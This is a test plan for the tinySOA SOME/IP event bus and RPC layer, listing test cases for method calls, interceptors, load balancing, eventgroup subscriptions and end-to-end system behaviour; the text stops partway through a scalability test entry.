**Title**
- SOME/IP Event Bus & RPC Method Test Plan (Design & Extended Coverage)

**Objectives**
- Clarify comprehensive test goals and case content for validating `SomeIPEventBus` behavior and RPC Method invocation over SOME/IP protocol.
- Extend testing to cover Method (RPC) invocation, interceptor chains, load balancing, and advanced SOME/IP protocol features.
- Ensure traceability to tinySOA architecture and design docs for future execution.
- Achieve > 95% coverage of SOME/IP protocol features and tinySOA framework capabilities.

**Update Summary**
This version extends the original test plan with:
1. **RPC Method Tests** (TC-M-001 to TC-M-015): Complete Method lifecycle, parameter serialization, timeout handling, concurrency
2. **Interceptor Chain Tests** (TC-I-001 to TC-I-008, TC-B-001 to TC-B-009): Execution order, built-in interceptors (Metrics, Logging, Tracing, Auth, RateLimit, Caching, Retry)
3. **Load Balancing & Failover** (TC-LB-001 to TC-LB-008): RoundRobin, Random, LatencyWeighted strategies; health scoring; failover behavior
4. **Enhanced Eventgroup Tests** (TC-EG-001 to TC-EG-010): Subscription, filtering, history, multi-client scenarios
5. **System Integration Tests** (ST-M-001 to ST-M-010, ST-I-001 to ST-I-005): End-to-end RPC calls, tracing, observability, circuit breaker
6. **Advanced SOME/IP Protocol** (PROTO-001 to PROTO-010): Header validation, SD protocol, session management, multiplexing, TTL, version compatibility
7. **Security & Method-Specific Tests** (SEC-M-001 to SEC-M-003, SEC-I-001 to SEC-I-003): Parameter injection, deserialization bombs, auth bypass, interceptor injection
8. **Extended Architecture & NFR Tests**: Configuration reload for methods, RPC-specific health monitoring, circuit breaker, latency and CPU profiling, protocol efficiency

**References**
- Tiny SOA code: [tinySOA/src/tinysoa/eventbus/someip.py](tinySOA/src/tinysoa/eventbus/someip.py)
- Design overview: [design/01-overview.md](design/01-overview.md)
- API design: [design/03-api-design.md](design/03-api-design.md)
- Lifecycle: [design/04-lifecycle.md](design/04-lifecycle.md)
- Configuration: [design/06-configuration.md](design/06-configuration.md)
- Monitoring/Tracing: [design/07-monitoring-tracing.md](design/07-monitoring-tracing.md)
- Event model: [design/09-internal-event-model.md](design/09-internal-event-model.md)

**Scope**
- In-scope: 
  - Unit tests: Mapping, lifecycle, internal logic, error handling using mocks.
  - Integration tests: Real UDP loopback communication, SD state machine interaction, timing scenarios (late joiners), and resilience.
  - System tests: Multi-process scenarios, performance benchmarking, long-term stability validation.
  - Security tests: Protection against malicious packets, DoS attacks, and resource exhaustion.
  - Architecture tests: Configuration hot-reload, plugin system, service dependency management.
  - Non-functional tests: Performance, scalability, memory usage, fault recovery metrics.
- Out-of-scope: 
  - Multi-host hardware deployment testing.
  - Production network environment validation (focus is on logic and protocol correctness on local stack).
  - **Low-level SOME/IP protocol compliance (Wire format, Endianness, Serialization correctness)**: These are delegated to the underlying `pysomeip` library. Tests focus on correct usage and configuration of the library.

**Strategy**
- **Unit Level**: Use `unittest.mock` to simulate `pysomeip` objects. Verify logic paths, error handling, parameter mapping, and concurrency controls.
- **Integration Level**: Use `asyncio` with real UDP sockets on `127.0.0.1`. Run Publisher and Subscriber in the same process to validate actual SOME/IP SD state machine and socket handling.
- **System Level**: Multi-process testing with realistic network conditions, load simulation, and fault injection to validate end-to-end behavior.
- **Security Level**: Penetration testing approach with malicious input injection, DoS simulation, and attack vector validation.
- **Performance Level**: Benchmark-driven testing with quantitative metrics for throughput, latency, resource usage, and scalability limits.
- **Architecture Level**: Feature validation testing for framework-specific capabilities like hot-reload, plugin systems, and service dependencies.
- **Case Classification**: Divided into Unit (TC-xxx), System (ST-xxx), Security (SEC-xxx), Architecture (ARCH-xxx), and Non-Functional Requirements (NFR-xxx).

**Case Catalogue**

### Unit Tests - RPC Method Invocation (Method相关测试)

- TC-M-001 Method Registration and Metadata
  - Preconditions: Service class decorated with @Service; @rpc decorator applied to methods.
  - Steps: Inspect service metadata; verify method_id, parameter types, return types registered.
  - Expected: Method metadata correctly registered in ServiceRegistry; parameter validation schema generated.

- TC-M-002 Synchronous Request-Response Call (RPC)
  - Preconditions: Bus started; remote service offering method.
  - Steps: Call `proxy.call(method_id, args=(...), kwargs={...})`.
  - Expected: Request serialized; sent via SOME/IP; response received; deserialized and returned; latency tracked.

- TC-M-003 Asynchronous Fire-and-Forget Call (Request/No-Response)
  - Preconditions: Bus started; method marked as `no_response=True`.
  - Steps: Call `proxy.call_oneway(method_id, args)`.
  - Expected: Request sent without waiting for response; method returns immediately; message_type set to REQUEST_NO_RETURN.

- TC-M-004 Method Parameter Serialization
  - Preconditions: Service accepts complex types (lists, dicts, custom objects).
  - Steps: Call method with various parameter types: int, str, list, dict, dataclass.
  - Expected: All types serialized correctly; round-trip preserves data; custom types use registered codecs.

- TC-M-005 Method Return Value Deserialization
  - Preconditions: Service method returns complex object (dict, object with multiple fields).
  - Steps: Call method; capture response payload.
  - Expected: Response deserialized to correct Python type; nested structures preserved; null/None values handled.

- TC-M-006 Method Timeout Handling
  - Preconditions: Service method takes > 1 second to respond.
  - Steps: Call method with `timeout_ms=500`.
  - Expected: Call times out; TimeoutError raised; connection state remains valid for subsequent calls.

- TC-M-007 Method Not Found (Unknown method_id)
  - Preconditions: Service registry contains no method for given method_id.
  - Steps: Call `proxy.call(unknown_method_id)`.
  - Expected: MethodNotFoundError raised; no crash; error logged with service/method IDs.

- TC-M-008 Method Parameter Validation
  - Preconditions: Method has type hints and validation rules.
  - Steps: Call with invalid parameters (wrong type, out of range, null where not allowed).
  - Expected: Validation error raised before sending request; clear error message indicates validation failure point.

- TC-M-009 Method Error Response Handling
  - Preconditions: Service method raises exception or returns error code.
  - Steps: Call method that raises an exception.
  - Expected: Exception serialized in response; client-side exception reconstructed; original error message preserved.

- TC-M-010 Concurrent Method Calls to Same Instance
  - Preconditions: Service with single instance.
  - Steps: Launch 100 concurrent `proxy.call()` to different methods.
  - Expected: All calls succeed; responses correctly matched to corresponding requests (via session ID); no message interleaving.

- TC-M-011 Concurrent Method Calls to Multiple Instances
  - Preconditions: Service with 5 instances.
  - Steps: Launch 50 concurrent calls; load balance across instances.
  - Expected: Calls distributed evenly; all succeed; latency balanced.

- TC-M-012 Method Idempotency Tracking
  - Preconditions: Method marked as `idempotent=True`.
  - Steps: Simulate duplicate request (same session_id, sequence number).
  - Expected: Server detects duplicate; returns cached response; no side effects executed twice.

- TC-M-013 Session ID and Sequence Number Management
  - Preconditions: Service with multiple concurrent clients.
  - Steps: Send multiple requests; inspect SOME/IP headers.
  - Expected: Each request has unique session_id; sequence numbers increment correctly per session; responses matched correctly.

- TC-M-014 Large Method Payload (64KB+)
  - Preconditions: Service method accepts large argument (file data, etc.).
  - Steps: Call with 100KB payload; call with 1MB payload.
  - Expected: Payloads > 64KB rejected gracefully with error; <= 64KB succeed; no buffer overflows.

- TC-M-015 Method Call Chain (A calls B calls C)
  - Preconditions: Three services; A calls B, B calls C.
  - Steps: Trace request through chain; verify context propagation (trace_id, span_id).
  - Expected: Trace context preserved through chain; distributed tracing shows full call graph; latencies additive.

### Interceptor Chain Tests

- TC-I-001 Interceptor Execution Order
  - Preconditions: Multiple interceptors registered: Logging, Auth, RateLimit, Caching, Retry.
  - Steps: Make method call; capture interceptor execution log.
  - Expected: Interceptors executed in defined order: Logging→Auth→RateLimit→Caching→Retry→RPC→Metrics→Tracing.

- TC-I-002 Before Request Interceptor
  - Preconditions: Custom interceptor with `before_request` hook.
  - Steps: Intercept request; modify context/request; return modified request.
  - Expected: Modification applied; downstream sees modified request; side effects occur before RPC call.

- TC-I-003 After Response Interceptor
  - Preconditions: Custom interceptor with `after_response` hook.
  - Steps: Intercept successful response; modify response payload/metadata.
  - Expected: Modification visible to caller; latency includes processing; side effects after RPC returns.

- TC-I-004 On Error Interceptor
  - Preconditions: Interceptor with `on_error` hook.
  - Steps: Trigger error in RPC call; intercept exception.
  - Expected: Interceptor can swallow exception and return response, or re-raise; error handling deterministic.

- TC-I-005 Short Circuit (Early Return)
  - Preconditions: Caching or Auth interceptor that can return early.
  - Steps: 
    1. First call: cache miss, full execution.
    2. Second identical call: cache hit, return early.
  - Expected: Second call bypasses RPC layer; returns immediately; no network traffic.

- TC-I-006 Interceptor Exception Handling
  - Preconditions: Interceptor raises exception in `before_request`.
  - Steps: Call method through broken interceptor.
  - Expected: Exception caught; error logged; caller receives clear error; interceptor chain doesn't crash.

- TC-I-007 Context Propagation Through Chain
  - Preconditions: Multiple interceptors; context set in first interceptor.
  - Steps: Set metadata in `before_request`; access in `after_response`.
  - Expected: Context visible across all interceptors; trace_id, span_id preserved; user metadata accessible.

- TC-I-008 Interceptor De-registration
  - Preconditions: Interceptor registered and active.
  - Steps: Remove interceptor; make call.
  - Expected: Interceptor hooks not called; behavior reverts to without-interceptor; no memory leaks.

### Built-in Interceptor Tests

- TC-B-001 Metrics Interceptor - Counter and Histogram
  - Preconditions: MetricsInterceptor enabled; Prometheus exporter configured.
  - Steps: 
    1. Make 100 successful method calls.
    2. Make 10 failed calls.
    3. Query Prometheus metrics.
  - Expected: Counter shows 100 success, 10 failure; histogram buckets populated with latency; labels correct (service_id, method_id).

- TC-B-002 Metrics Interceptor - Latency Percentiles
  - Preconditions: MetricsInterceptor enabled; histogram configured with standard buckets.
  - Steps: Make calls with varying response times; measure p50, p95, p99 latency.
  - Expected: Percentiles correctly computed; p50 < p95 < p99; buckets bounded appropriately.

- TC-B-003 Logging Interceptor - Structured Logs
  - Preconditions: LoggingInterceptor with JSON output enabled.
  - Steps: Make method call; capture logs.
  - Expected: Log contains structured fields: trace_id, service_id, method_id, status, latency_ms, client_address.

- TC-B-004 Tracing Interceptor - Span Creation
  - Preconditions: TracingInterceptor with OpenTelemetry backend.
  - Steps: Make method call; inspect exported span.
  - Expected: Span created with correct service/method names; attributes set; span_id in response headers.

- TC-B-005 Auth Interceptor - Token Validation
  - Preconditions: AuthInterceptor with token validation.
  - Steps: 
    1. Call with valid token → succeeds.
    2. Call with invalid token → 403 Unauthorized.
    3. Call with no token → 401 Unauthenticated.
  - Expected: Auth rules enforced; requests short-circuited early; no backend call for unauthorized.

- TC-B-006 RateLimit Interceptor - Token Bucket
  - Preconditions: RateLimitInterceptor with 10 req/sec limit.
  - Steps: 
    1. Send 5 requests in 100ms (within limit) → all succeed.
    2. Send 20 requests in 100ms (exceed limit) → some rejected with 429.
  - Expected: Limiting enforced; requests queued or rejected gracefully; recovery after window.

- TC-B-007 Retry Interceptor - Automatic Retry
  - Preconditions: RetryInterceptor with max_retries=3; method marked as idempotent.
  - Steps: Simulate transient failure (first 2 calls fail, 3rd succeeds).
  - Expected: Retry triggered automatically; all 3 attempts logged; final result returned to caller.

- TC-B-008 Caching Interceptor - Cache Hit/Miss
  - Preconditions: CachingInterceptor with TTL=60s.
  - Steps:
    1. Call method (cache miss) → backend call made, result cached.
    2. Call again within 60s (cache hit) → response from cache, no backend call.
    3. Wait > 60s, call again (cache expired) → new backend call.
  - Expected: Cache TTL respected; hit/miss rates accurate; stale data not served after expiry.

- TC-B-009 Caching Interceptor - Cache Invalidation
  - Preconditions: CachingInterceptor; cache contains data.
  - Steps: Modify backend state; call method with cache_bust=True.
  - Expected: Cache entry invalidated; new data fetched; subsequent calls return updated data.

### Load Balancing and Failover Tests

- TC-LB-001 RoundRobin Load Balancer
  - Preconditions: Service with 3 instances; RoundRobin LB enabled.
  - Steps: Make 10 method calls; track which instance handles each call.
  - Expected: Calls distributed in round-robin order (0→1→2→0→1→2...); distribution even.

- TC-LB-002 Random Load Balancer
  - Preconditions: Service with 3 instances; Random LB enabled.
  - Steps: Make 1000 calls; measure distribution.
  - Expected: Distribution roughly uniform (each instance ≈333 calls); no hot spots; randomness verified statistically.

- TC-LB-003 Latency Weighted Load Balancer
  - Preconditions: Service with 3 instances; instance A fast (1ms), B medium (10ms), C slow (100ms); LatencyWeighted LB.
  - Steps: Make 1000 calls; measure per-instance call counts.
  - Expected: Fast instance A receives more traffic (~60%); medium B ~30%; slow C ~10%; weighted by latency.

- TC-LB-004 Health Score Computation
  - Preconditions: LoadBalancer tracking instance health.
  - Steps: Simulate success/failure ratio for each instance.
  - Expected: Health score = (availability * 0.4) + (1-latency_ratio * 0.4) + (1-load_ratio * 0.2); weights applied correctly.

- TC-LB-005 Instance Filtering by Health
  - Preconditions: 3 instances; one is degraded (health_score < 0.1).
  - Steps: Make calls; track instance distribution.
  - Expected: Degraded instance excluded from selection; calls routed to healthy instances; degraded instance retried after recovery.

- TC-LB-006 Failover on Instance Failure
  - Preconditions: Service with 3 instances; instance A fails after 50 successful calls.
  - Steps: 
    1. Make 50 calls to A (all succeed).
    2. Instance A crashes; make next call.
    3. Automatic failover to B or C.
  - Expected: Failed call is retried on another instance; recovery time < 1 second; health score of A decreases.

- TC-LB-007 Failover Retry Exhaustion
  - Preconditions: Service with 2 instances; max_retries=1.
  - Steps: Both instances fail; attempt method call.
  - Expected: Both instances tried; final error raised after retries exhausted; clear error message with attempted endpoints.

- TC-LB-008 Load Balancer Strategy Override
  - Preconditions: Default LB strategy is RoundRobin.
  - Steps: Make call with `lb_policy_override="latency_weighted"`.
  - Expected: Single call uses overridden strategy; subsequent calls revert to default; context-scoped override.

### Eventgroup and Subscription Tests (Enhanced)

- TC-EG-001 Eventgroup Registration
  - Preconditions: Service with eventgroup defined.
  - Steps: Inspect eventgroup metadata; verify event_id, element types registered.
  - Expected: Eventgroup metadata correct; event elements in order; serialization schema generated.

- TC-EG-002 Eventgroup Subscription (SD Protocol)
  - Preconditions: Service publishing events; client wants to subscribe.
  - Steps: Call `proxy.subscribe(eventgroup_id)`.
  - Expected: SD Subscribe message sent; server responds with subscription confirmation; event stream established.

- TC-EG-003 Event Notification (Async Iterator)
  - Preconditions: Subscription active.
  - Steps: 
    1. Service publishes event with data.
    2. Client iterates `async for event in subscription`.
  - Expected: Event received asynchronously; data deserialized correctly; iterator continues until unsubscribed.

- TC-EG-004 Event Filtering
  - Preconditions: Eventgroup emits multiple event IDs; client subscribed with filter.
  - Steps: Client sets `filter_fn` to select only specific events.
  - Expected: Unmatched events filtered out; only matching events yielded; no event loss (buffering correct).

- TC-EG-005 Event History/Retransmission
  - Preconditions: Eventgroup with event history enabled (initial_events=10).
  - Steps: Subscribe to existing eventgroup; verify historical events delivered.
  - Expected: Last N events sent immediately on subscription; then live events follow; history cleared after TTL.

- TC-EG-006 Multi-Subscriber Same Eventgroup
  - Preconditions: Two independent clients subscribe to same eventgroup.
  - Steps: Service publishes event; both clients receive it.
  - Expected: Event delivered to both independently; no cross-talk; each has own cursor position.

- TC-EG-007 Unsubscribe and Cleanup
  - Preconditions: Active eventgroup subscription.
  - Steps: Call `unsubscribe()`; attempt to iterate subscription.
  - Expected: SD Unsubscribe sent; event stream terminates gracefully; subsequent iterations fail with clear error.

- TC-EG-008 Event Sequence Number Tracking
  - Preconditions: Eventgroup emitting events continuously.
  - Steps: Subscribe and collect sequence numbers; check for gaps or duplicates.
  - Expected: Sequence numbers monotonically increasing (mod 16-bit); detect packet loss via gaps; no duplicates on loopback.

- TC-EG-009 Large Event Payload
  - Preconditions: Eventgroup event with >1KB payload.
  - Steps: Subscribe; receive and deserialize large event.
  - Expected: Payloads ≤ 64KB handled correctly; > 64KB rejected with error; no buffer overflows.

- TC-EG-010 Event Bus Internal Events
  - Preconditions: EventBus configured to emit internal events (SERVICE_DISCOVERED, SERVICE_LOST, etc).
  - Steps: Start service; observe internal events fired.
  - Expected: SERVICE_DISCOVERED fired when service becomes available; SERVICE_LOST when unavailable; events correlate with actual state.

### TC-001 Mapping Resolution
  - Preconditions: Bus started; mapping exists for topic.
  - Steps: Call `subscribe(topic, handler)`.
  - Expected: Returns `Subscription`; schedules SOME/IP subscribe via `_start_subscription()`.

- TC-002 Unknown Topic Handling
  - Preconditions: Bus started; unknown topic.
  - Steps: `subscribe(unknown)`; `publish(unknown)`.
  - Expected: `subscribe` raises `ValueError`; `publish` warns and returns without error.

- TC-003 Serialization Roundtrip
  - Preconditions: Bus constructed.
  - Steps: `_serialize_message(EventMessage)` with UUID/Timestamp → `_deserialize_message(bytes)`.
  - Expected: Topic, payload preserved; `message_id` is UUID type; `timestamp` is datetime type; JSON format.

- TC-004 Publisher Startup and Notify Path
  - Preconditions: Bus started; first publish for a mapped topic.
  - Steps: `publish()`.
  - Expected: Creates `SomeIPPublisher` with pre-allocated port; `start()` invoked; `notify(eventgroup_id, event_id, payload)` called.

- TC-005 Eventgroup Registration Order
  - Preconditions: `add_eventgroup()` invoked before `start()`.
  - Steps: `start(announcer)`.
  - Expected: Eventgroup adapters registered prior to SD announce; avoids missed subscriptions.

- TC-006 Subscriber Handler Dispatch
  - Preconditions: `_subscriber.subscribe()` captures `on_notification`.
  - Steps: Invoke `on_notification(payload_bytes)`.
  - Expected: Payload deserialized; all local handlers for topic awaited; errors logged but do not break dispatch chain.

- TC-007 Unsubscribe and SD Stop
  - Preconditions: Single local subscriber for a mapped topic.
  - Steps: `unsubscribe(subscription)`.
  - Expected: Local list cleared; `_stop_subscription(mapping)` invoked; SD stop called.

- TC-008 Port Allocation Determinism
  - Preconditions: Multiple topics share `(service_id, instance_id)`; another uses different `instance_id`.
  - Steps: Construct bus; inspect `_service_ports`.
  - Expected: Same pair → same port; different instance → different port; base `publisher_port` respected.

- TC-009 Subscription Sequencing and Delay
  - Preconditions: Bus started.
  - Steps: Two `subscribe()` calls; intercept `asyncio.sleep`.
  - Expected: Delay computed as `5.0 + (seq_num * 0.8)`; second subscription uses larger delay.

- TC-010 SD Invocation Parameters
  - Preconditions: `_subscriber` present.
  - Steps: Trigger `_start_subscription(mapping, topic, seq)`.
  - Expected: SD `find_subscribe_eventgroup` called with `service_id`, `instance_id`, `eventgroup_id`, `major_version`, and UDP `sockname`.

- TC-011 Error Paths: Bus Not Started
  - Preconditions: Bus not started.
  - Steps: `subscribe()`; `publish()`.
  - Expected: `subscribe` raises `RuntimeError`; `publish` warns and returns.

- TC-012 Malformed Payload Handling
  - Preconditions: Captured `on_notification`.
  - Steps: Invoke with non-JSON payload.
  - Expected: Deserialization error logged; no handler calls; bus remains stable.

- TC-013 Multi-Subscriber Delivery
  - Preconditions: Two local handlers subscribed to same topic.
  - Steps: Simulate single notification.
  - Expected: Both handlers receive the deserialized `EventMessage` once.

- TC-014 Multi-Publisher Scenario Readiness (Design)
  - Preconditions: Multiple topics mapping to same service; distinct ports pre-allocated.
  - Steps: Inspect `_service_ports`; publish across topics.
  - Expected: Publishers reuse per-service port; eventgroup IDs differentiate notifications.

- TC-015 Bus Shutdown
  - Preconditions: Bus started; publishers and subscribers active.
  - Steps: Call `stop()`.
  - Expected: All publishers stopped; subscriber stopped; SD protocol stopped; transports closed; `_started` flag reset.

- TC-016 Service Discovery Startup Failure
  - Preconditions: Mock `ServiceDiscoveryProtocol.create_endpoints` raises `OSError`.
  - Steps: Call `start()`.
  - Expected: Bus starts in degraded mode (no SD); warning logged; no exception raised.

- TC-017 Duplicate Subscription
  - Preconditions: Bus started.
  - Steps: Call `subscribe(topic, handler)` twice with same handler.
  - Expected: Handler registered twice; incoming message triggers handler twice (verifying list behavior).

- TC-018 Multiple Bus Instances Port Isolation
  - Preconditions: Two `SomeIPEventBus` instances in same process.
  - Steps: Initialize both with overlapping mappings.
  - Expected: Global port allocator ensures no port conflicts between instances for same (service, instance) pair.

- TC-019 Concurrent Publication Race Condition
  - Preconditions: Bus started; multiple threads publishing to same topic simultaneously.
  - Steps: Launch 10 threads each publishing 100 messages to same topic within 1 second.
  - Expected: All 1000 messages published successfully; no corruption in publisher state; no port allocation conflicts.

- TC-020 Concurrent Subscription Race Condition
  - Preconditions: Bus started.
  - Steps: Launch 50 threads simultaneously calling `subscribe(topic, handler)` for same topic.
  - Expected: All handlers registered correctly; subscription sequence numbers assigned atomically; no duplicate SD requests.

- TC-021 Publisher-Subscriber Creation Race
  - Preconditions: Bus started.
  - Steps: 
    1. Thread A: Rapidly publish to Topic X (start publisher).
    2. Thread B: Simultaneously subscribe to Topic X.
    3. Repeat 100 times with different topics.
  - Expected: No deadlocks; all subscriptions eventually succeed; SD state machine remains consistent.

- TC-022 Port Allocation Under Load
  - Preconditions: Multiple EventBus instances.
  - Steps: Create 100 EventBus instances in parallel, each with 10 unique (service_id, instance_id) pairs.
  - Expected: All 1000 services get unique ports; no allocation conflicts; deterministic port assignment.

- TC-023 Subscription Counter Overflow
  - Preconditions: Bus started; mock `_SUBSCRIPTION_COUNTER` to near overflow value.
  - Steps: Subscribe to multiple topics rapidly.
  - Expected: Counter overflow handled gracefully; delay calculation remains stable; no integer overflow exceptions.

- TC-024 Large Payload Boundary Test
  - Preconditions: Bus started.
  - Steps: Publish EventMessage with payload sizes: 1KB, 64KB, 1MB, 10MB.
  - Expected: Messages ≤ 64KB succeed; larger payloads fail gracefully with clear error messages; no memory leaks.

- TC-025 Malformed JSON Payload Handling
  - Preconditions: Subscriber active.
  - Steps: Inject malformed JSON payloads: incomplete JSON, invalid UTF-8, binary data.
  - Expected: Deserialization errors logged; subscriber remains stable; no handler calls triggered; error metrics updated.

- TC-026 SD Protocol Failure Recovery
  - Preconditions: Bus started; mock SD to fail intermittently.
  - Steps: Attempt subscriptions during SD failures.
  - Expected: Bus degrades gracefully; retries SD operations; succeeds when SD recovers; appropriate warnings logged.

- TC-027 UDP Buffer Overflow Simulation
  - Preconditions: System with limited UDP receive buffer.
  - Steps: Flood publisher with high-frequency notifications; monitor buffer usage.
  - Expected: Messages dropped gracefully; no crashes; back-pressure mechanisms triggered; metrics show buffer status.

- TC-028 Network Interface Down/Up Cycle
  - Preconditions: Established Pub-Sub connection.
  - Steps: Simulate network interface down → wait 5s → bring up.
  - Expected: Connection automatically re-establishes; SD re-announces services; data flow resumes; minimal message loss.

- TC-029 Invalid SOME/IP Header Handling
  - Preconditions: Subscriber listening.
  - Steps: Send packets with corrupted SOME/IP headers: wrong magic, invalid length, bad CRC.
  - Expected: Invalid packets discarded; no parsing exceptions; security logs generated; subscriber remains functional.

**System & Integration Case Catalogue - Method RPC**

- ST-M-001 End-to-End Method Call with Real Network
  - Preconditions: Publisher Service with RPC method; Subscriber Service as client; Real UDP loopback.
  - Steps:
    1. Start Publisher service with `@rpc(method_id=0x0001) async def add(a, b) -> int: return a + b`
    2. Start Subscriber service.
    3. Call `proxy.call(method_id=0x0001, args=(3, 5))` via real network.
  - Expected: Request serialized into SOME/IP message; sent via UDP; received by publisher; method executed; response sent back; client deserializes and returns 8.

- ST-M-002 Multi-Service RPC Chain
  - Preconditions: Three services A, B, C; A calls B, B calls C.
  - Steps:
    1. Start services A, B, C.
    2. Service C: `multiply(x, y) -> int`
    3. Service B: `add_then_multiply(a, b) -> int` calls C.multiply(a+b, 2)
    4. Service A calls B with `add_then_multiply(3, 5)` should return (3+5)*2 = 16
  - Expected: Call chain succeeds; trace_id propagated through all services; distributed tracing shows full graph; latency includes all hops.

- ST-M-003 RPC with Large Payloads
  - Preconditions: Services capable of handling large data; real network.
  - Steps: Call method with payloads of increasing size: 1KB, 10KB, 64KB, 100KB (exceeds limit).
  - Expected: 1KB-64KB succeed; 100KB rejected with size error; intermediate sizes split/reassembled correctly; no corruption.

- ST-M-004 Concurrent RPC Calls (Stress)
  - Preconditions: Publisher with fast method; multiple concurrent clients.
  - Steps: Launch 100 concurrent clients each making 10 RPC calls simultaneously.
  - Expected: All 1000 calls succeed; responses correctly matched to requests; no message loss; latency within SLA.

- ST-M-005 RPC Timeout and Retry Behavior
  - Preconditions: Method that varies in execution time; retry interceptor active.
  - Steps:
    1. Make call with timeout=1000ms; method takes 500ms (success).
    2. Make call with timeout=100ms; method takes 500ms (timeout).
    3. Retry mechanism triggers; method succeeds on 2nd attempt.
  - Expected: Timeouts correctly detected; retries transparent to caller; final result returned; retry count logged.

- ST-M-006 RPC Failure Scenarios
  - Preconditions: Service with error-prone methods.
  - Steps:
    1. Call method that raises exception → exception serialized and returned.
    2. Call invalid method_id → MethodNotFound error.
    3. Service crashes mid-call → connection error, automatic failover to replica.
  - Expected: All failures handled gracefully; errors propagated with context; service recovers.

- ST-M-007 RPC Load Balancing Across Instances
  - Preconditions: Service with 3 instances; LatencyWeighted LB enabled; instances vary in latency.
  - Steps: Make 300 RPC calls; track distribution across instances.
  - Expected: Calls weighted by instance latency/health; fast instance ~60%, slow ~10%; automatic failover if instance dies.

- ST-M-008 RPC with Stateful Methods
  - Preconditions: Service maintains state (counter, cache, etc).
  - Steps:
    1. Call `increment()` 10 times from different clients.
    2. Call `get_value()` → returns 10.
    3. Verify state consistency across clients.
  - Expected: State mutations atomic; all clients see consistent view; concurrent increments don't race.

- ST-M-009 Fire-and-Forget (One-Way) Calls
  - Preconditions: Service with `call_oneway` enabled.
  - Steps:
    1. Call `proxy.call_oneway(method_id, args)`.
    2. Verify call returns immediately without waiting.
    3. Verify service method executes asynchronously.
  - Expected: No response expected; caller returns immediately; server processes asynchronously; fire-and-forget semantics.

- ST-M-010 RPC Version Negotiation
  - Preconditions: Service with version (1, 0); proxy can request (1, 0) or (2, 0).
  - Steps:
    1. Proxy discovers service version (1, 0).
    2. Call method; verify server version accepted.
    3. Update service to (2, 0); proxy discovers new version.
  - Expected: Version checked at discovery; correct version endpoint selected; incompatible versions rejected with clear error.

### System Test - Interceptor Chain and Observability

- ST-I-001 End-to-End Tracing (Jaeger Integration)
  - Preconditions: Three services A→B→C; Jaeger collector running; OpenTelemetry exporter configured.
  - Steps:
    1. Trigger call from A → B → C.
    2. Export trace to Jaeger.
    3. Query Jaeger UI; verify full call graph.
  - Expected: Trace ID propagated through all services; Spans for each hop; span_id correctly nested; timing shows latency at each service.

- ST-I-002 Metrics Export to Prometheus
  - Preconditions: EventBus with MetricsInterceptor; Prometheus scraper configured.
  - Steps:
    1. Make 1000 RPC calls (success and failure mix).
    2. Query Prometheus: `tinysoa_rpc_requests_total`, `tinysoa_rpc_latency_seconds`.
  - Expected: Counters match actual call count; histogram percentiles accurate; labels match service/method IDs; NaN/Inf handled.

- ST-I-003 Structured Logging Aggregation
  - Preconditions: LoggingInterceptor configured; logs sent to ELK or Splunk.
  - Steps: Make calls; query log aggregator.
  - Expected: Each call logged with trace_id; requests, responses, errors all present; trace_id enables correlation; latency fields present.

- ST-I-004 Circuit Breaker Activation (via Interceptor)
  - Preconditions: Service instance degraded (90% error rate); CircuitBreakerInterceptor enabled.
  - Steps:
    1. Make calls to degraded instance (10 successes, 100 failures in window).
    2. Circuit breaker opens; subsequent calls immediately rejected without network attempt.
    3. Wait recovery window; circuit half-opens; test request sent.
    4. Recovery: circuit closes if test succeeds.
  - Expected: Circuit state transitions: CLOSED → OPEN → HALF_OPEN → CLOSED; latency improves after opening (no long timeouts).

- ST-I-005 Interceptor Chain Failure Isolation
  - Preconditions: Multiple interceptors; one crashes.
  - Steps: Make call through broken interceptor.
  - Expected: Exception caught; error logged; other interceptors still execute; call fails gracefully.

### System Test - Original ST Tests

- ST-001 Real Loopback Communication
  - Preconditions: Real network stack available; no mocks.
  - Steps: Start Bus; Subscribe (Topic A); Publish (Topic A).
  - Expected: Message travels via UDP loopback; SD negotiation succeeds; Payload received intact.

- ST-002 Late Subscriber Discovery (Pub First)
  - Preconditions: Bus started.
  - Steps: 
    1. Start Publisher for Topic A.
    2. Wait 2 seconds.
    3. Start Subscriber for Topic A.
    4. Publish message.
  - Expected: Subscriber detects existing Service via SD Offer; successfully subscribes and receives message.

- ST-003 Late Publisher Discovery (Sub First)
  - Preconditions: Bus started.
  - Steps:
    1. Start Subscriber for Topic A.
    2. Wait 2 seconds (Sub sends SD Find).
    3. Start Publisher for Topic A.
    4. Publish message.
  - Expected: Publisher receives SD Find or sends SD Offer; Subscriber matches and receives message.

- ST-004 Service Restart Resilience
  - Preconditions: Established Pub-Sub connection.
  - Steps:
    1. Stop Publisher (simulate crash/restart).
    2. Wait 1 second.
    3. Restart Publisher.
    4. Publish message.
  - Expected: Subscriber detects service down (optional) and re-detects service up; communication resumes automatically.

- ST-005 High Frequency Stress Test
  - Preconditions: Established connection.
  - Steps: Publish 1000 messages at 10ms interval.
  - Expected: No packet loss (on loopback); order preserved (mostly, UDP not guaranteed but high probability on loopback); no memory leaks.

- ST-006 Network Partition Recovery Test
  - Preconditions: Established Pub-Sub connection.
  - Steps:
    1. Block network traffic between Publisher/Subscriber using iptables.
    2. Wait 30 seconds (simulate network partition).
    3. Restore network connectivity.
    4. Verify message flow resumes.
  - Expected: Services automatically re-discover; SD re-negotiates subscriptions; data flow resumes within 10 seconds.

- ST-007 Long-term Stability Test (24 Hours)
  - Preconditions: Production-like load scenario.
  - Steps:
    1. Run 10 publishers + 50 subscribers for 24 hours.
    2. Publish 1 message/second per publisher.
    3. Monitor memory, CPU, file descriptors.
  - Expected: Memory usage stable; no resource leaks; all messages received; error rate < 0.01%.

- ST-008 Multi-Process Deployment Scenario
  - Preconditions: Separate Publisher/Subscriber processes on different PIDs.
  - Steps:
    1. Start Publisher process on port 30490.
    2. Start 5 Subscriber processes on different ports.
    3. Verify cross-process communication.
    4. Kill/restart processes randomly.
  - Expected: Inter-process communication works; process failures don't affect others; automatic recovery.

- ST-009 Performance Benchmark Test
  - Preconditions: Dedicated test environment.
  - Steps: Measure throughput (msg/sec) and latency (avg/p95/p99) for various scenarios:
    - 1 Pub → 1 Sub
    - 1 Pub → 10 Subs  
    - 10 Pubs → 1 Sub
    - 10 Pubs → 10 Subs
  - Expected: Throughput ≥ 1000 msg/sec; P99 latency ≤ 100ms; Linear scaling with subscriber count.

- ST-010 Resource Constraint Test
  - Preconditions: Container with limited resources (512MB RAM, 1 CPU).
  - Steps: Run EventBus with 100 topics, 500 subscribers, high message rate.
  - Expected: Graceful degradation under resource pressure; priority handling; no crashes; error metrics available.

- ST-011 Service Discovery Scalability
  - Preconditions: 100 services with unique (service_id, instance_id).
